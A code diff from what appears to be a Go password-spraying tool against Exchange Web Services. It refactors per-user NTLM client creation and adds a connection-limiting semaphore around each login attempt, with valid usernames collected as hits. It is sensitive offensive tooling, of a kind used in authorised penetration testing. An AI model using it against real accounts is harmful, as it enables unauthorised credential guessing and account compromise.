@@ -37,13 +37,8 @@ func duplicateUsernameList(entries []duplicateUsername) []string {
 }
 
 func runSpray(cfg appConfig, stdout, stderr io.Writer) int {
-	baseClient := ews.NewClient(ews.ClientOpts{
-		NTLM: cfg.NTLM, TimeoutSec: cfg.Timeout, MaxConns: cfg.Conns,
-		DisableKeepAlive: cfg.NTLM, // NTLM binds auth to TCP connection; do not reuse across users.
-	})
-
 	return runSprayWithTester(cfg, stdout, stderr, func(username string) (ews.AuthResult, error) {
-		attemptClient := ews.CloneClientWithFreshJar(baseClient, true)
+		attemptClient := ews.NewIsolatedAuthClient(cfg.NTLM, cfg.Timeout)
 		return ews.TestAuth(attemptClient, cfg.URL, username, cfg.Pass)
 	})
 }
@@ -101,6 +96,7 @@ func runSprayWithTester(cfg appConfig, stdout, stderr io.Writer, testAuth func(s
 	var opErrorCount atomic.Int64
 	totalUsers := int64(len(users))
 	workCh := make(chan string, cfg.Workers*2)
+	connSem := make(chan struct{}, cfg.Conns)
 	pacer := newRequestPacer(cfg.DelayMS)
 	var wg sync.WaitGroup
 
@@ -125,8 +121,10 @@ func runSprayWithTester(cfg appConfig, stdout, stderr io.Writer, testAuth func(s
 			fmt.Fprint(stderr, formatAttemptProgress(completed, totalUsers, running, username, hits))
 			outputMu.Unlock()
 
-			result, authErr := testAuth(username)
-			switch result {
+				connSem <- struct{}{}
+				result, authErr := testAuth(username)
+				<-connSem
+				switch result {
 			case ews.AuthSuccess:
 				stateMu.Lock()
 				validUsers = append(validUsers, username)
